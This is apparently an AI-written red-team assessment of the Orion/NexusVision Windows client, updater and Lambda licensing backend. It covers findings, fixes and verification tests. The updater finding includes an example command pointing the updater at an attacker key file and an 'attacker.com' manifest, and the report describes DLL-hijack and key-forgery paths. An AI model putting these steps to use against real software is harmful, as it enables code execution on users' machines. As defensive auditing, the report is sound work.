# Orion / NexusVision Red-Team Security Assessment (2026-09-19)

**Author:** Codex (Authorized Red-Team Tester & Blue-Team Lead)  
**Target:** NexusVision / Orion Production Candidate  
**Active Repo:** `C:\Users\aaron\Desktop\NexusVision`  
**Verdict:** **BLOCKED**

---

## 1. Executive Summary & Verdict

```text
================================================================================
RELEASE INTEGRITY VERDICT: BLOCKED
================================================================================
```

A comprehensive, zero-assumption red-team audit was conducted across the Orion ecosystem, targeting the 5 designated attack surfaces:
1. **License / Auth Bypass & Containment**
2. **Updater Abuse & Code Signing**
3. **Launcher Reverse-Engineering & Native Binaries**
4. **Runtime Tampering & Integrity Gates**
5. **Backend & Admin API Surface**

While the core security posture features defense-in-depth (fail-closed release manifest signatures, robust Ed25519 verification primitives, DPAPI-bound local entitlement caching, and granular Admin V2 RBAC), **critical release blockers** were identified that require immediate remediation before customer release.

Most notably:
- The production update-signing private key exists in cleartext on disk outside the protected vault and in an agent transcript.
- `OrionUpdater.exe` allows local public-key override via command-line flags and environment variables even in production configurations, and fails to enforce domain allowlisting on download URLs.
- Dynamic loading in `VeniceNetClient.cpp` contains an unqualified `LoadLibraryW` fallback vulnerable to DLL hijacking.
- Released packages ship unmanifested test binaries (`GreenWindowMathChecks.exe`) and plaintext Python helpers.
- The multi-device licensing model (`max_devices > 1`) suffers from a critical activation state overwrite bug that locks out concurrent authorized machines.

---

## 2. Severity Classification Matrix

| Finding ID | Severity | Category | Target Component | Status |
|---|---|---|---|---|
| **CF-1** | **CATASTROPHIC** | Key Exposure | Code Signing / Local Disk | **RELEASE BLOCKER** |
| **CRIT-1** | **CRITICAL** | Updater Abuse | `OrionUpdater.exe` (`updater_main.cpp`) | **RELEASE BLOCKER** |
| **CRIT-2** | **CRITICAL** | DLL Hijacking | `RemotePlayCore.dll` (`VeniceNetClient.cpp`) | **RELEASE BLOCKER** |
| **CRIT-3** | **CRITICAL** | Package Integrity | `release/orion-package` | **RELEASE BLOCKER** |
| **HIGH-1** | **HIGH** | Auth / DoS | `backend/lambda_function.py` (`handle_activate`) | Needs Changes |
| **HIGH-2** | **HIGH** | Least Privilege | AWS SSM / Lambda IAM Role | Needs Changes |
| **HIGH-3** | **HIGH** | Heartbeat Lease | `LeaseGate.cpp` / Lambda Deployment | Launch Blocker (B2) |
| **MED-1** | **MEDIUM** | Logic Flaw | `SecurityManager.cpp` (First-Run Bootstrap) | Hardening |
| **MED-2** | **MEDIUM** | API Abuse | `backend/lambda_function.py` (`rate_limit_ok`) | Hardening |
| **MED-3** | **MEDIUM** | Spoofing | `backend/lambda_function.py` (`_client_ip`) | Hardening |
| **LOW-1** | **LOW** | Key Hygiene | AWS SSM (`/orion/manifest_signing_key`) | Cleanup |
| **LOW-2** | **LOW** | Audit Hygiene | `tools/security_audit.py` (`ESSENTIAL_FILES`) | Consistency |

---

## 3. In-Depth Vulnerability Findings

### [CATASTROPHIC] CF-1: Production Update-Signing Private Key Exposed in Cleartext
- **Affected Artifacts:**
  - `C:\Users\aaron\Desktop\EXPLOITS\helios_bypass\codesigning\venice_update_signing.pem`
  - `C:\Users\aaron\.claude\projects\C--Users-aaron-Desktop-NexusVision\7396b864-…\subagents\agent-a801f0de6b5a1390d.jsonl`
- **Exploit Path:**
  An unencrypted copy of the production Ed25519 update-signing private key resides in a non-vault location on disk. Additionally, an earlier automated tool transcript logged the entire private key in cleartext. Any unprivileged process or unauthorized inspection can extract the private key.
- **Impact:**
  Allows an attacker to forge genuine, Ed25519-signed update manifests and `release_manifest.sig` files. `OrionUpdater.exe` and `SecurityManager` will treat malicious payloads as official updates and execute them.
- **Required Fix:**
  1. Full Ed25519 key rotation: Generate a new keypair offline using `tools/signing/` into a dedicated encrypted store.
  2. Update public key pins: `ED25519_PUBLIC_KEY_B64` in `tools/package_orion_release.py:84`, `ORION_UPDATE_ED25519_PUBKEY` in `native_orion/CMakeLists.txt:359`, `kReleaseManifestPublicKeyB64` in `ReleaseManifestTrust.h:11`, and SSM parameter `/orion/ed25519_public_key`.
  3. Securely wipe the unencrypted PEM file and sanitize historic agent logs.
- **Verification Test:**
  Confirm public key pin derivation matches the newly generated key, old signatures fail verification, and secret scans (`tools/security_audit.py`) pass cleanly.

---

### [CRITICAL] CRIT-1: Local Public-Key Injection & Unchecked Manifest URLs in `OrionUpdater.exe`
- **Affected File:**
  - `native_orion/src/updater_main.cpp` (Lines 77–116, 244)
- **Exploit Path:**
  1. In `resolvePublicKey()`, the updater accepts `--pubkeys-file <path>` via command line, checks `qgetenv("ORION_UPDATE_PUBKEYS")`, and reads unauthenticated `installDir/update_pubkeys.json` without verifying if the build is production.
  2. Line 244 validates only that `manifest.url.startsWith("https://")`, completely omitting the domain allowlist (`ARTIFACT_URL_ALLOWLIST`).
- **Impact:**
  An unprivileged attacker or malware running locally can invoke `OrionUpdater.exe --pubkeys-file evil_keys.json --manifest-url https://attacker.com/manifest.json`. When `OrionAppController` launches `OrionUpdater.exe` elevated via UAC (`ShellExecuteExW runas`), an attacker tampering with `update_pubkeys.json` in a per-user directory can achieve elevated arbitrary code execution.
- **Required Fix:**
  1. Enclose `--pubkeys-file`, `ORION_UPDATE_PUBKEYS`, and `--manifest-file` options inside `#ifndef ORION_PRODUCTION_BUILD`. In production, the updater must exclusively trust the compile-time embedded public key (`ORION_UPDATE_ED25519_PUBKEY`).
  2. Enforce `ARTIFACT_URL_ALLOWLIST` in `OrionUpdater.exe` before initiating artifact download.
  3. Validate that `update_pubkeys.json` matches the release manifest if dynamic keys are ever supported.
- **Verification Test:**
  Attempt running production `OrionUpdater.exe` with `--pubkeys-file` and a non-allowlisted HTTPS URL; the updater must fail closed and reject both.

---

### [CRITICAL] CRIT-2: DLL Hijacking in `VeniceNetClient.cpp` via Unqualified `LoadLibraryW`
- **Affected File:**
  - `native_orion/src/VeniceNetClient.cpp` (Lines 47–53)
- **Exploit Path:**
  ```cpp
  const QString appDll = QDir::toNativeSeparators(
      QCoreApplication::applicationDirPath() + QStringLiteral("/VeniceNet.dll"));
  module_ = ::LoadLibraryW(reinterpret_cast<const wchar_t*>(appDll.utf16()));
  if (module_ == nullptr) {
      module_ = ::LoadLibraryW(L"VeniceNet.dll"); // <-- VULNERABILITY
  }
  ```
  Neither `SetDefaultDllDirectories` nor `SetDllDirectoryW(L"")` is initialized by `main.cpp`. If `VeniceNet.dll` is missing from the application directory, Windows falls back to standard search order: Current Working Directory (CWD) and system PATH.
- **Impact:**
  If the application is launched from a folder containing a rogue `VeniceNet.dll` (e.g. from an unpacked zip, browser download directory, or network share), arbitrary code executes within `OrionNative.exe`.
- **Required Fix:**
  1. Delete the bare `::LoadLibraryW(L"VeniceNet.dll")` fallback.
  2. Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_APPLICATION_DIR | LOAD_LIBRARY_SEARCH_SYSTEM32)` at the very beginning of `main()` in `main.cpp` and `updater_main.cpp`.
  3. Add `VeniceNet.dll` to `ESSENTIAL_PACKAGE_FILES` in `tools/security_audit.py`.
- **Verification Test:**
  Simulate startup with `VeniceNet.dll` absent from app dir and present in CWD; verify the launcher safely logs a missing module error without loading the CWD binary.

---

### [CRITICAL] CRIT-3: Release Package Contamination with Test Binaries & Plaintext Python
- **Affected Path:**
  - `release/orion-package/GreenWindowMathChecks.exe`
  - `release/orion-package/backend/ps5_remoteplay_helper.py`
- **Exploit Path:**
  Inspection of `release/orion-package` revealed `GreenWindowMathChecks.exe` (a test executable built from `tests/GreenWindowMathTests.cpp`) and uncompiled Python script `backend/ps5_remoteplay_helper.py` (which directly imports and references `analysis_cosmic_static/pyremoteplay_src`).
- **Impact:**
  Direct violation of AGENTS.md release blockers ("package ships lab/exploit/test artifacts"). Shipping plaintext source and test harnesses exposes internal algorithms, timing structures, and developer paths.
- **Required Fix:**
  1. Update `tools/package_orion_release.py` and `tools/release_filter_policy.py` to forbid `GreenWindowMathChecks.exe` and test binary variants.
  2. Compile `ps5_remoteplay_helper.py` through Nuitka or bundle it within `OrionSidecar.exe`.
- **Verification Test:**
  `powershell -ExecutionPolicy Bypass -File scripts\verify_orion.ps1 -StrictSecurity` must assert no test executables or loose Python files exist in `release/orion-package`.

---

### [HIGH] HIGH-1: Multi-Device Activation Desync & Heartbeat Lockout (`max_devices > 1`)
- **Affected File:**
  - `backend/lambda_function.py` (Lines 736–745, 1738–1740)
- **Exploit Path:**
  In `handle_activate`:
  ```python
  licenses_table().update_item(
      Key={"license_key": license_key},
      UpdateExpression="ADD activations :one SET machine_id = :m, last_activated = :t",
      ConditionExpression=(
          "machine_id = :m OR attribute_not_exists(machine_id) OR machine_id = :empty "
          "OR activations < :max OR attribute_not_exists(activations)"
      ), ...
  )
  ```
  When a key with `max_devices = 2` activates Machine A, `machine_id` is set to `Machine A`. When Machine B activates, `activations < :max` passes, but `SET machine_id = :m` overwrites the field with `Machine B`.
  In `handle_validate` (`/api/license/check`):
  ```python
  if item.get("machine_id") != machine_id:
      return err("device_mismatch", 403, message="This licence is bound to a different PC.")
  ```
- **Impact:**
  On its next 5-minute heartbeat, Machine A sends its own `machine_id`. The backend checks `item.get("machine_id")` (now `Machine B`), finds a mismatch, and terminates Machine A's session with `device_mismatch`. Multi-device tiers cannot function concurrently.
- **Required Fix:**
  Change `machine_id` storage on multi-device licenses to a DynamoDB String Set (`SS`) or list of bound hardware IDs (`bound_machines`), e.g., `ADD bound_machines :m_set`. Update `handle_validate` to verify `machine_id in item.get("bound_machines", [item.get("machine_id")])`.
- **Verification Test:**
  Create unit test in `tests/backend/test_new2_device_cap.py` activating two distinct machine IDs on a `max_devices=2` license and asserting both successfully validate consecutive heartbeats.

---

### [HIGH] HIGH-2: Over-Privileged Lambda SSM Access to Offline Update Key
- **Affected Component:**
  - AWS SSM Parameter Store (`/orion/ed25519_private_key`)
  - AWS IAM Lambda Execution Role (`orion-activate-lambda-role`)
- **Exploit Path:**
  Following CRIT-2 remediation, update-manifest signing is strictly offline. However, the private update signing key remains stored in SSM at `/orion/ed25519_private_key`. If the Lambda execution role has broad `ssm:GetParameter` access over `arn:aws:ssm:*:*:parameter/orion/*`, any code execution vulnerability in the Lambda allows extraction of the master update key.
- **Impact:**
  Breaches the architectural boundary isolating update-signing authority from the live web tier.
- **Required Fix:**
  1. Take an offline vault backup of the PEM keypair.
  2. Delete `/orion/ed25519_private_key` from SSM.
  3. Ensure the Lambda IAM role policy enumerates only parameters required for runtime (`/orion/token_secret`, `/orion/admin_secret`, `/orion/lease_signing_key`, etc.).
- **Verification Test:**
  Inspect Lambda IAM execution policy to verify explicit least-privilege parameter ARNs.

---

### [HIGH] HIGH-3: Heartbeat Lease Failure (Launch Blocker B2)
- **Affected Files:**
  - `native_orion/src/LeaseGate.cpp` (Line 173)
  - `backend/lambda_function.py` (`sign_lease`)
- **Exploit Path:**
  `LeaseGate.cpp` was updated on 2026-09-19 with rotated public key `KKBzDoL7+FrwNmBg86z+Vk84oEdRQFLqfD1ahFb/XhY=`. The live Lambda in production currently lacks the `cryptography` Python package and `/orion/lease_signing_key` parameter in SSM. As logged in CloudWatch, calls fail with `[LEASE] signing unavailable (fail-soft): No module named 'cryptography'`.
- **Impact:**
  Under `ORION_PRODUCTION_BUILD`, `LeaseGate::enabledFromEnvironment()` returns `true` unconditionally. Because live heartbeats carry no valid `lease_sig`, all customer builds will fail-closed and stop firing exactly 15 minutes after activation.
- **Required Fix:**
  Deploy `backend/build_lambda_zip.ps1` output (`orion-activate.zip`, containing `cryptography==50.0.1` and compiled CFFI backend) and ensure the matching private key is populated in SSM parameter `/orion/lease_signing_key`.
- **Verification Test:**
  Run `tests/backend/test_new1_lease_sig.py` and native `AutomationEngineTests.cpp` `leaseGateVerifiesPythonSignedLeaseVector`.

---

### [MEDIUM] MED-1: Contradictory File Existence Check in Settings Signature First-Run Bootstrap
- **Affected File:**
  - `native_orion/src/SecurityManager.cpp` (Lines 408–419)
- **Exploit Path:**
  ```cpp
  if (!status.settingsSignatureValid && status.releaseManifestRequired
      && !QFile::exists(settingsPath()) && !QFile::exists(settingsSigPath())) {
      ...
      if (QFile::exists(settingsPath()) && writeSettingsSignature(&_bootErr) ...)
  ```
  Line 409 checks `!QFile::exists(settingsPath())`, while line 414 checks `QFile::exists(settingsPath())`. If `AppConfig::save()` created `settings.json` during early initialization, line 409 evaluates to false, skipping first-run auto-signing and potentially locking out automation.
- **Impact:**
  Intermittent lockout on initial run if `OrionAppController::init()` fallback does not execute in time.
- **Required Fix:**
  Change line 409 condition to `(!QFile::exists(settingsPath()) || !QFile::exists(settingsSigPath()))` and remove the redundant inner existence check.
- **Verification Test:**
  Perform clean-install test in a fresh user profile directory lacking `%LOCALAPPDATA%\Orion`.

---

### [MEDIUM] MED-2: Fail-Open Exception Handling on Money Endpoint Rate Limiting
- **Affected File:**
  - `backend/lambda_function.py` (Lines 349–368)
- **Exploit Path:**
  `rate_limit_ok()` intercepts all DynamoDB exceptions and returns `True` ("fail-open on infra error").
- **Impact:**
  If an attacker generates high contention or triggers provisioned throughput limits on table `orion-ratelimit`, the rate limiter fails open across `/api/activate` and `/api/license/check`, enabling brute-force activation attacks.
- **Required Fix:**
  On critical endpoints (`activate`, `staff_login`), fail-closed when DynamoDB returns transient errors, or implement a memory-bounded local cache fallback.
- **Verification Test:**
  Mock DynamoDB client failure in `tests/backend/test_med1_activate_replay.py` and verify sensitive authentication requests are rejected rather than allowed.

---

### [MEDIUM] MED-3: Client IP Spoofing Fallback via Unsanitized `X-Forwarded-For`
- **Affected File:**
  - `backend/lambda_function.py` (Line 373)
- **Exploit Path:**
  `_client_ip(event)` returns `http.get("sourceIp") or (event.get("headers") or {}).get("x-forwarded-for", "")`.
- **Impact:**
  If invoked directly via Function URL or misconfigured gateway, an attacker supplying a spoofed `X-Forwarded-For` header can bypass IP-based rate limiting and poison audit logs.
- **Required Fix:**
  Rely exclusively on Cloudflare-authenticated headers (`cf-connecting-ip`) when edge routing is active, or canonical API Gateway `requestContext.http.sourceIp`.
- **Verification Test:**
  Supply forged `X-Forwarded-For` headers in backend test harness; confirm IP tracking reflects true transport peer.

---

### [LOW] LOW-1: Orphan Sensitive 64-Hex HMAC Key in SSM (`/orion/manifest_signing_key`)
- **Affected Component:**
  - AWS SSM Parameter Store (`/orion/manifest_signing_key`)
- **Observation:**
  Parameter exists as a 64-character hex string created prior to the Ed25519 migration. No codebase references read this parameter.
- **Impact:**
  Confuses audit gates and operators.
- **Action:**
  Back up offline and delete parameter from AWS SSM.

---

### [LOW] LOW-2: Missing `VeniceNet.dll` in Security Audit Essential Files Inventory
- **Affected File:**
  - `tools/security_audit.py` (Lines 48–65)
- **Observation:**
  `ESSENTIAL_PACKAGE_FILES` contains `AutomationCore.dll`, `VisionCore.dll`, etc., but omits `VeniceNet.dll`.
- **Impact:**
  A release package missing `VeniceNet.dll` will pass `security_audit.py` without alerting that network delay functionality is impaired.
- **Action:**
  Add `"VeniceNet.dll"` to `ESSENTIAL_PACKAGE_FILES`.

---

## 4. Blue-Team Remediation Plan & Checklist

### Immediate Release Blockers to Resolve Prior to Approval:
- [ ] **Rotate Update Keypair:**
  - Run `tools/signing/` to mint fresh Ed25519 keypair into offline vault.
  - Update public key constants in client code and SSM.
  - Securely shred `venice_update_signing.pem` in `helios_bypass` folder and purge transcript copies.
- [ ] **Hard-Lock `OrionUpdater.exe`:**
  - Strip `--pubkeys-file`, `ORION_UPDATE_PUBKEYS`, and `--manifest-file` in production builds.
  - Hardcode `ARTIFACT_URL_ALLOWLIST` validation.
- [ ] **Fix DLL Hijack Vector:**
  - Remove bare `LoadLibraryW(L"VeniceNet.dll")`.
  - Add `SetDefaultDllDirectories` at entry points.
  - Add `VeniceNet.dll` to `tools/security_audit.py`.
- [ ] **Sanitize Release Packaging:**
  - Exclude `GreenWindowMathChecks.exe` and test binaries from `release/orion-package`.
  - Compile `ps5_remoteplay_helper.py`.
- [ ] **Deploy Lambda Cryptography Layer & SSM Lease Key:**
  - Deploy `orion-activate.zip` to AWS Lambda `orion-activate`.
  - Set SSM `/orion/lease_signing_key` matching `LeaseGate.cpp:173`.
  - Verify lease verification passes in live test.

---

## 5. Verification Commands

```powershell
# Standard Verification
powershell -ExecutionPolicy Bypass -File scripts\verify_orion.ps1 -Python .venv\Scripts\python.exe

# Strict Security Gate
powershell -ExecutionPolicy Bypass -File scripts\verify_orion.ps1 -Python .venv\Scripts\python.exe -StrictSecurity

# Backend Test Suite (Isolated Environment)
.venv\Scripts\python.exe -m pytest tests/backend --basetemp=native_orion/build/pytest_temp
```

---
*Report completed and filed by Codex Red-Team / Blue-Team harness.*
